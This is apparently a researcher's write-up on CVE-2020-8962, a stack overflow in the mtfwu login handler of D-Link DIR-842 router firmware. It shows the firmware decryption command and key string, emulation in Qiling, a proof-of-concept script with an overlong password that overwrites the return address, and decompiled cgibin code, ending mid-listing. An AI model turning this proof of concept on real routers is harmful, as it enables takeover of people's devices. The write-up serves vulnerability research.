
Ref 
- https://ucgjhe.github.io/post/cve_2020_8962/

Version
- DIR842C1_FW302b03_middle

Download from
- https://media.dlink.eu/support/products/dir/dir-842/driver_software/dir-842_fw_revc1_3-02b03_eu_multi_20180817.zip

# Decrypt firmware
```bash
user@vm-ubuntu20:~/Downloads$ binwalk DIR842C1_FW302b03_middle.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/5"
112           0x70            uImage header, header size: 64 bytes, header CRC: 0xA33A0532, created: 2018-07-02 07:26:57, image size: 1234680 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xE2D6A8D0, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: "MIPS Seattle Linux-3.3.8"
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3641936 bytes
1245296       0x130070        PackImg section delimiter tag, little endian size: 11572736 bytes; big endian size: 9875456 bytes
1245328       0x130090        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 9872196 bytes, 2533 inodes, blocksize: 131072 bytes, created: 2018-07-02 07:27:09

user@vm-ubuntu20:~/Downloads/_DIR842C1_FW302b03_middle.bin.extracted/squashfs-root/usr/sbin$ file encimg 
encimg: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, not stripped


```

# Emulate 

By using qiling , more convenient ,don’t need  qemu and chroot

```bash
user@vm-ubuntu20:~/Downloads/_DIR842C1_FW302b03_middle.bin.extracted$ python3 de.py 
no signature specified!
Usage: encimg {OPTIONS}
   -h                      : show this message.
   -v                      : Verbose mode.
   -i {input image file}   : input image file.
   -e                      : encode file.
   -d                      : decode file.
   -s                      : signature.
```

But fail

```bash
user@vm-ubuntu20:~/Downloads/_DIR842C1_FW302b03_middle.bin.extracted$ python3 de.py 
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90000000
[=]     stat(path = 0x47c09e4, buf_ptr = 0x7ff3ca68) = -0x2 (ENOENT)
[=]     open(filename = 0x7ff3c280, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c0f8) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x1d0000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x90002000
[=]     mmap(addr = 0x90002000, length = 0x1a8e20, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x90002000
[=]     mmap(addr = 0x901ba000, length = 0x15940, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x1a8000) = 0x901ba000
[=]     mmap(addr = 0x901d0000, length = 0x1ea0, prot = 0x3, flags = 0x812, fd = 0xffffffff, pgoffset = 0x0) = 0x901d0000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c270, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c0e8) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x24000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x901d2000
[=]     mmap(addr = 0x901d2000, length = 0x12d24, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x901d2000
[=]     mmap(addr = 0x901f4000, length = 0x1178, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x12000) = 0x901f4000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c260, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c0d8) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x7f000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x901f6000
[=]     mmap(addr = 0x901f6000, length = 0x68d50, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x901f6000
[=]     mmap(addr = 0x9026e000, length = 0x1ecc, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x68000) = 0x9026e000
[=]     mmap(addr = 0x90270000, length = 0x4d0c, prot = 0x3, flags = 0x812, fd = 0xffffffff, pgoffset = 0x0) = 0x90270000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c250, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c0c8) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x14000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x90275000
[=]     mmap(addr = 0x90275000, length = 0x27f0, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x90275000
[=]     mmap(addr = 0x90287000, length = 0x10e0, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x2000) = 0x90287000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c240, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c0b8) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     open(filename = 0x7ff3c230, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c0a8) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     open(filename = 0x7ff3c220, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c098) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     stat(path = 0x900007e8, buf_ptr = 0x7ff3c9f8) = 0x0
[=]     open(filename = 0x7ff3c200, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c078) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     set_thread_area(u_info_addr = 0x90008440) = 0x0
[=]     open(filename = 0x47c0db8, flags = 0x0, mode = 0x0) = -0x1 (EPERM)
[=]     gettimeofday(tv = 0x7ff3cb40, tz = 0x0) = 0x0
[=]     mprotect(start = 0x901f4000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     mprotect(start = 0x9026e000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     mprotect(start = 0x90287000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     mprotect(start = 0x47d0000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     ioctl(fd = 0x0, cmd = 0x540d, arg = 0x7ff3c9c4) = -0x1 (EPERM)
[=]     ioctl(fd = 0x1, cmd = 0x540d, arg = 0x7ff3c9c4) = -0x1 (EPERM)
[=]     brk(inp = 0x0) = 0x415000
[=]     brk(inp = 0x416000) = 0x416000
[=]     open(filename = 0x415008, flags = 0x2, mode = 0x401e7c) = 0x3
[=]     stat64(path = 0x415008, buf_ptr = 0x7ff3cbf0) = 0x0
[=]     read(fd = 0x3, buf = 0x7ff3cd20, length = 0x4) = 0x4
[x]     Syscall ERROR: ql_syscall_mmap DEBUG: Out Of Memory
```

So I decrypt the firmware in qemu

```bash

user@debian:~$ sudo chroot squashfs-root/ /bin/sh


BusyBox v1.22.1 (2018-07-02 15:18:10 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

# /usr/sbin/encimg -d -i DIR842C1_FW313WWb05.bin -s wrgac65_dlink.2015_dir842
The file length of DIR842C1_FW313WWb05.bin is 11280544




user@vm-ubuntu20:~/Downloads/_DIR842C1_FW302b03_middle.bin.extracted$ binwalk decode.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             DLOB firmware header, boot partition: "dev=/dev/mtdblock/5"
112           0x70            uImage header, header size: 64 bytes, header CRC: 0xA5A9FEC, created: 2019-09-10 02:41:50, image size: 1234827 bytes, Data Address: 0x80060000, Entry Point: 0x80060000, data CRC: 0xAAFF08AD, OS: Linux, CPU: MIPS, image type: Multi-File Image, compression type: lzma, image name: "MIPS Seattle Linux-3.3.8"
184           0xB8            LZMA compressed data, properties: 0x6D, dictionary size: 8388608 bytes, uncompressed size: 3641936 bytes
1245296       0x130070        PackImg section delimiter tag, little endian size: 2136320 bytes; big endian size: 10035200 bytes
1245328       0x130090        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 10032180 bytes, 2560 inodes, blocksize: 131072 bytes, created: 2019-09-10 02:41:56

```

Modify the exploit to fit `qiling 1.4.7.dev0` , `unicorn 2.0.1.post1`

Also need make symbolic link to `cgibin`

```bash
user@vm-ubuntu20:~/Downloads/_decode.bin.extracted$ file squashfs-root/usr/sbin/mtfwu 
squashfs-root/usr/sbin/mtfwu: symbolic link to /home/user/Downloads/_decode.bin.extracted/squashfs-root/htdocs/cgibin
```

```python
from qiling import *
from qiling.extensions import pipe
# hook function for syscall sysinfo
def my_syscall_sysinfo(ql, sysinfo_info, *args, **kwargs):
    ql.mem.write(sysinfo_info, b"AAAA") # uptime
    regreturn = 0
    ql.log.info(f"sysinfo(0x{sysinfo_info:02x}) = {regreturn}")
    return regreturn

# dump all registers
def dump_reg(ql, *args, **kwargs):
    ql.log.info("="*0x10 + " register dump " + "="*0x10)
    for idx, val in ql.arch.regs.save().items():
        if not isinstance(idx, int):
            ql.log.info(f"{idx}: {hex(val)}")
    breakpoint()
# fake stdin for sending payload
class Fake_stdin:
    def read(self, size, *args, **kwargs):
        return b'ACTION=login&LOGINPASSWORD=' + b'A' * 0x248
    def fileno(self, *args, **kwargs):
        return 0
if __name__ == "__main__":
    envs = {
            "REQUEST_METHOD": "POST",
            "REQUEST_URI": "/MTFWU",
            "CONTENT_TYPE": "application/x-www-form-urlencoded",
            "HTTP_MTFWU_ACT": "Login",
            "HTTP_COOKIE": "uid=AAAA",
            "CONTENT_LENGTH": str(27+0x248), 
            }

    ql = Qiling(["squashfs-root/usr/sbin/mtfwu"], "squashfs-root", 
                env=envs,           # setting environment variables 
                ) # hijack stdin with Fake_stdin
    ql.os.set_syscall("sysinfo", my_syscall_sysinfo)  # syscall hook for sysinfo
    ql.os.set_syscall("_newselect", lambda *_: None)  # hook syscall _newselect with anonymous NOP function to avoid manual input requirement
    ql.hook_address(dump_reg, 0x41d3f0)            # breakpoint before return and dump all registers

    with open("squashfs-root/var/session/c1", "wb+") as fh: # setup propper session file
        fh.write(b"AAAA\x00" + b"A"*0xbf)                   # first four bytes were the UID in cookie
    ql.os.stdin = pipe.SimpleInStream(0)
    ql.os.stdin.write(b'ACTION=login&LOGINPASSWORD=' + b'A' * 0x248)
    ql.run()
```

```bash
user@vm-ubuntu20:~/Downloads/_decode.bin.extracted$ python3 exp.py
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90000000
[=]     stat(path = 0x47c09e4, buf_ptr = 0x7ff3ca08) = -0x2 (ENOENT)
[=]     open(filename = 0x7ff3c220, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c098) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x1d0000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x90002000
[=]     mmap(addr = 0x90002000, length = 0x1a8e20, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x90002000
[=]     mmap(addr = 0x901ba000, length = 0x15940, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x1a8000) = 0x901ba000
[=]     mmap(addr = 0x901d0000, length = 0x1ea0, prot = 0x3, flags = 0x812, fd = 0xffffffff, pgoffset = 0x0) = 0x901d0000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c210, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c088) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x24000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x901d2000
[=]     mmap(addr = 0x901d2000, length = 0x12d24, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x901d2000
[=]     mmap(addr = 0x901f4000, length = 0x1178, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x12000) = 0x901f4000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c200, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c078) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x7f000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x901f6000
[=]     mmap(addr = 0x901f6000, length = 0x68d50, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x901f6000
[=]     mmap(addr = 0x9026e000, length = 0x1ecc, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x68000) = 0x9026e000
[=]     mmap(addr = 0x90270000, length = 0x4d0c, prot = 0x3, flags = 0x812, fd = 0xffffffff, pgoffset = 0x0) = 0x90270000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c1f0, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c068) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     read(fd = 0x3, buf = 0x90001000, length = 0x1000) = 0x1000
[=]     mmap(addr = 0x0, length = 0x14000, prot = 0x0, flags = 0x802, fd = 0xffffffff, pgoffset = 0x0) = 0x90275000
[=]     mmap(addr = 0x90275000, length = 0x27f0, prot = 0x5, flags = 0x12, fd = 0x3, pgoffset = 0x0) = 0x90275000
[=]     mmap(addr = 0x90287000, length = 0x10e0, prot = 0x3, flags = 0x12, fd = 0x3, pgoffset = 0x2000) = 0x90287000
[=]     close(fd = 0x3) = 0x0
[=]     munmap(addr = 0x90001000, length = 0x1000) = 0x0
[=]     open(filename = 0x7ff3c1e0, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c058) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     open(filename = 0x7ff3c1d0, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c048) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     open(filename = 0x7ff3c1c0, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c038) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     stat(path = 0x900007e8, buf_ptr = 0x7ff3c998) = 0x0
[=]     open(filename = 0x7ff3c1a0, flags = 0x0, mode = 0x0) = 0x3
[=]     fstat(fd = 0x3, buf_ptr = 0x7ff3c018) = 0x0
[=]     close(fd = 0x3) = 0x0
[=]     mmap(addr = 0x0, length = 0x1000, prot = 0x3, flags = 0x4000802, fd = 0xffffffff, pgoffset = 0x0) = 0x90001000
[=]     set_thread_area(u_info_addr = 0x90008440) = 0x0
[=]     open(filename = 0x47c0db8, flags = 0x0, mode = 0x0) = -0x1 (EPERM)
[=]     gettimeofday(tv = 0x7ff3cae0, tz = 0x0) = 0x0
[=]     mprotect(start = 0x901f4000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     mprotect(start = 0x9026e000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     mprotect(start = 0x90287000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     mprotect(start = 0x47d0000, mlen = 0x1000, prot = 0x1) = 0x0
[=]     ioctl(fd = 0x0, cmd = 0x540d, arg = 0x7ff3c964) = -0x1 (EPERM)
[=]     ioctl(fd = 0x1, cmd = 0x540d, arg = 0x7ff3c964) = -0x1 (EPERM)
[=]     socket(domain = 0x1, socktype = 0x2, protocol = 0x0) = 0x3
[=]     fcntl64(fd = 0x3, cmd = 0x2, arg = 0x1) = 0x0
[=]     setsockopt(sockfd = 0x3, level = 0xffff, optname = 0x1005, optval_addr = 0x7ff3cc30, optlen = 0x8) = -0x1 (EPERM)
[=]     close(fd = 0x3) = 0x0
[=]     brk(inp = 0x0) = 0x448000
[=]     brk(inp = 0x449000) = 0x449000
[=]     <lambda>() = ?
[=]     read(fd = 0x0, buf = 0x7ff3c74c, length = 0x263) = 0x263
[=]     open(filename = 0x7ff3c758, flags = 0x2, mode = 0x0) = 0x3
[=]     fcntl64(fd = 0x3, cmd = 0x7, arg = 0x7ff3c704) = 0x0
[=]     read(fd = 0x3, buf = 0x7ff3c964, length = 0xc4) = 0xc4
[=]     close(fd = 0x3) = 0x0
[=]     sysinfo(0x7ff3c738) = 0
[=]     my_syscall_sysinfo(sysinfo_info = 0x7ff3c738) = 0x0
[=]     open(filename = 0x7ff3c780, flags = 0x2, mode = 0x0) = 0x3
[=]     fcntl64(fd = 0x3, cmd = 0x7, arg = 0x7ff3c72c) = 0x0
[=]     read(fd = 0x3, buf = 0x7ff3c964, length = 0xc4) = 0xc4
[=]     close(fd = 0x3) = 0x0
[=]     ================ register dump ================
[=]     r0: 0x0
[=]     r1: 0xfffffff8
[=]     r2: 0xffffffff
[=]     r3: 0xa
[=]     r4: 0xa
[=]     r5: 0x9026f124
[=]     r6: 0x2
[=]     r7: 0x43176a
[=]     r8: 0xd
[=]     r9: 0x0
[=]     r10: 0x200
[=]     r11: 0x100
[=]     r12: 0x807
[=]     r13: 0x800
[=]     r14: 0x400
[=]     r15: 0x440000
[=]     r16: 0x7ff3cfe0
[=]     r17: 0x90256000
[=]     r18: 0x4014f4
[=]     r19: 0x0
[=]     r20: 0x0
[=]     r21: 0x0
[=]     r22: 0x0
[=]     r23: 0x0
[=]     r24: 0x4428d4
[=]     r25: 0x9022f250
[=]     r26: 0x0
[=]     r27: 0x0
[=]     r28: 0x90277400
[=]     r29: 0x7ff3cc70
[=]     r30: 0x41414141
[=]     r31: 0x41414141
[=]     zero: 0x0
[=]     at: 0xfffffff8
[=]     v0: 0xffffffff
[=]     v1: 0xa
[=]     a0: 0xa
[=]     a1: 0x9026f124
[=]     a2: 0x2
[=]     a3: 0x43176a
[=]     t0: 0xd
[=]     t1: 0x0
[=]     t2: 0x200
[=]     t3: 0x100
[=]     t4: 0x807
[=]     t5: 0x800
[=]     t6: 0x400
[=]     t7: 0x440000
[=]     s0: 0x7ff3cfe0
[=]     s1: 0x90256000
[=]     s2: 0x4014f4
[=]     s3: 0x0
[=]     s4: 0x0
[=]     s5: 0x0
[=]     s6: 0x0
[=]     s7: 0x0
[=]     t8: 0x4428d4
[=]     t9: 0x9022f250
[=]     k0: 0x0
[=]     k1: 0x0
[=]     gp: 0x90277400
[=]     sp: 0x7ff3cc70
[=]     s8: 0x41414141  // overflowq
[=]     ra: 0x41414141  // overflow
[=]     status: 0x0
[=]     lo: 0x16
[=]     hi: 0x0
[=]     badvaddr: 0x0
[=]     cause: 0x0
[=]     pc: 0x41d3f0
[=]     cp0_config3: 0x2000
[=]     cp0_userlocal: 0x90008440
[=]     f0: 0x0
[=]     f1: 0x0
[=]     f2: 0x0
[=]     f3: 0x0
[=]     f4: 0x0
[=]     f5: 0x0
[=]     f6: 0x0
[=]     f7: 0x0
[=]     f8: 0x0
[=]     f9: 0x0
[=]     f10: 0x0
[=]     f11: 0x0
[=]     f12: 0x0
[=]     f13: 0x0
[=]     f14: 0x0
[=]     f15: 0x0
[=]     f16: 0x0
[=]     f17: 0x0
[=]     f18: 0x0
[=]     f19: 0x0
[=]     f20: 0x0
[=]     f21: 0x0
[=]     f22: 0x0
[=]     f23: 0x0
[=]     f24: 0x0
[=]     f25: 0x0
[=]     f26: 0x0
[=]     f27: 0x0
[=]     f28: 0x0
[=]     f29: 0x0
[=]     f30: 0x0
[=]     f31: 0x0
--Return--
> /home/user/Downloads/_decode.bin.extracted/exp.py(17)dump_reg()->None
-> breakpoint()
(Pdb) 
```


# Reverse cgibin

```c
int __fastcall sub_401DB0(int a1, const char **a2, int a3)
{
  int v4; // [sp+18h] [+18h]
  const char *v5; // [sp+18h] [+18h]
  int v6; // [sp+1Ch] [+1Ch]

  v6 = 1;
  v4 = strrchr(*a2, 47);
  if ( v4 )
    v5 = (const char *)(v4 + 1);
  else
    v5 = *a2;
  if ( !strcmp((int)v5, (int)"phpcgi") )
    return sub_406BAC(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"dlapn.cgi") )
    return sub_40A6D4(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"dldongle.cgi") )
    return sub_40A688(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"dlcfg.cgi") )
    return sub_40A5F0(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"seama.cgi") )
    return sub_40A558(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"fwup.cgi") )
    return sub_40A5A4(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"dlsyslog.cgi") )
    return sub_40A63C(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"fwupdater") )
    return sub_40CA18(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"session.cgi") )
    return sub_40FF38(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"authentication.cgi")
    || !strcmp((int)v5, (int)"authentication_logout.cgi")
    || !strcmp((int)v5, (int)"webfa_authentication.cgi")
    || !strcmp((int)v5, (int)"webfa_authentication_logout.cgi") )
  {
    return sub_412EE8(a1, a2, a3);
  }
  if ( !strcmp((int)v5, (int)"captcha.cgi") )
    return sub_410590(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"hedwig.cgi") )
    return sub_4138C4(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"pigwidgeon.cgi") )
    return sub_414560(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"service.cgi") )
    return sub_41529C(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"ssdpcgi") )
    return sub_415DCC(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"soap.cgi") )
    return sub_416968(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"gena.cgi") )
    return sub_417700(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"conntrack.cgi") )
    return sub_418044(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"hnap") )
    return sub_41B438(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"fwupload.cgi") )
    return sub_41BBC8(a1, a2, a3);
  if ( !strcmp((int)v5, (int)"mtfwu") )
    return sub_41D5A0(a1, (int)a2, a3);
  if ( !strcmp((int)v5, (int)"authcgi") )
    return sub_41BF08(a1, a2, a3);
  printf("CGI.BIN, unknown command %s\n", v5);
  return v6;
}
```

```c
int __fastcall sub_41D5A0(int a1, int a2, int a3)
{
  int v4; // [sp+20h] [+20h]
  int v5; // [sp+24h] [+24h]
  int v6; // [sp+24h] [+24h]
  void *HTTP_MTFWU_act; // [sp+28h] [+28h]
  void *cookie; // [sp+2Ch] [+2Ch]
  const char *http_refer; // [sp+30h] [+30h]
  int HTTP_MTFWU_AUTH; // [sp+38h] [+38h]
  int v11; // [sp+3Ch] [+3Ch]
  int v12[2]; // [sp+44h] [+44h] BYREF
  __int16 v13; // [sp+4Ch] [+4Ch]
  int v14[4]; // [sp+50h] [+50h] BYREF

  v4 = 0;
  v12[0] = 0;
  v12[1] = 0;
  v13 = 0;
  getenv("REQUEST_METHOD");
  HTTP_MTFWU_act = (void *)getenv("HTTP_MTFWU_ACT");
  HTTP_MTFWU_AUTH = getenv("HTTP_MTFWU_AUTH");
  cookie = (void *)getenv("HTTP_COOKIE");
  http_refer = (const char *)getenv("HTTP_REFERER");
  v14[0] = (int)"mtfwu_fwupdater";
  v14[1] = (int)"-v";
  v14[2] = (int)"/var/firmware.seama";
  if ( !cookie )
    cookie = &unk_4318D8;
  if ( !http_refer )
    http_refer = (const char *)&unk_4318D8;
  if ( !HTTP_MTFWU_act )
    HTTP_MTFWU_act = &unk_4318D8;
  sub_41EC4C(0, 0, "/runtime/login_antihacker/mtfwu_login_fail_count", v12, 10);
  v5 = atoi(v12);
  if ( strcmp((int)HTTP_MTFWU_act, (int)"FWUpload") )
    sub_405A1C(sub_41CC94, 0, 1024);
  v11 = sub_41C560((int)"ACTION");
  if ( v5 >= 3 )
  {
    sub_41C94C("failed more than 3 times");
    return -1;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"Login") && v11 && !strcmp(v11, (int)"request") )
    return sub_41CD98();
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"Login") && v11 && !strcmp(v11, (int)"login") )
  {
    v4 = nn_vuln_func((int)cookie);
    if ( v4 )
      v6 = v5 + 1;
    else
      v6 = 0;
    snprintf(v12, 10, "%d", v6);
    sub_41EF3C(0, 0, "/runtime/login_antihacker/mtfwu_login_fail_count", v12);
    return v4;
  }
  if ( sub_41D3F8(cookie, HTTP_MTFWU_AUTH, HTTP_MTFWU_act) )
  {
    nn_ret2user(301, 0, http_refer);
    return -1;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"Reboot") )
  {
    system("event REBOOT > /dev/null &");
    nn_return200();
    return v4;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"FactoryDefault") )
  {
    system("event FRESET > /dev/null &");
    nn_return200();
    return v4;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"GetDevInfo") )
  {
    sub_41EEB0(0, 0, "/htdocs/webinc/MTFWU.php\nInputACT=GetDevInfo", stdout);
    return v4;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"MTFWUActSupportList") )
  {
    sub_41EEB0(0, 0, "/htdocs/webinc/MTFWU.php\nInputACT=MTFWUActSupportList", stdout);
    return v4;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"FWUpload") )
  {
    v4 = sub_405A1C(sub_41CB1C, 0, 16056320);
    if ( v4 >= 0 )
    {
      v4 = sub_40A2D4(dword_4453D0, 1);
      if ( v4 >= 0 )
      {
        nn_return200();
        goto LABEL_40;
      }
    }
    else if ( v4 == -100 )
    {
      sub_41CA78("The size of firmware is too large.");
LABEL_40:
      sub_402F5C();
      return v4;
    }
    sub_41CA78(&unk_4318D8);
    goto LABEL_40;
  }
  if ( !strcmp((int)HTTP_MTFWU_act, (int)"FWUpdate") )
  {
    v4 = sub_40CA18(3, v14, a3);
    if ( v4 )
    {
      sub_41CA78(&unk_4318D8);
    }
    else
    {
      system("sleep 3;fw_upgrade /var/firmware.seama > /dev/null &");
      nn_return200();
    }
  }
  return v4;
}
```


```c
int __fastcall sub_41D0A8(int nn_cookie)
{
  int v2; // [sp+18h] [+18h]------------------------------------------- 488
  int v3; // [sp+1Ch] [+1Ch]
  int v4; // [sp+1Ch] [+1Ch]
  int nn_loginpassowrd; // [sp+20h] [+20h] -----------------------------480
  int v6; // [sp+20h] [+20h]
  char v7[4]; // [sp+24h] [+24h] BYREF
  int v8; // [sp+28h] [+28h]                                     0x488-0x240 = 0x248
  char v9[80]; // [sp+2Ch] [+2Ch] BYREF
  char v10[144]; // [sp+7Ch] [+7Ch] BYREF
  char v11[64]; // [sp+10Ch] [+10Ch] BYREF
  char v12[64]; // [sp+14Ch] [+14Ch] BYREF
  __int16 v13; // [sp+18Ch] [+18Ch]
  char v14[64]; // [sp+19Ch] [+19Ch] BYREF
  _BYTE v15[68]; // [sp+1DCh] [+1DCh] BYREF
  _BYTE v16[64]; // [sp+220h] [+220h] BYREF
  char v17[128]; // [sp+260h] [+260h] BYREF------------------------------ 240
  char nn_uid[64]; // [sp+2E0h] [+2E0h] BYREF
  char v19[64]; // [sp+320h] [+320h] BYREF
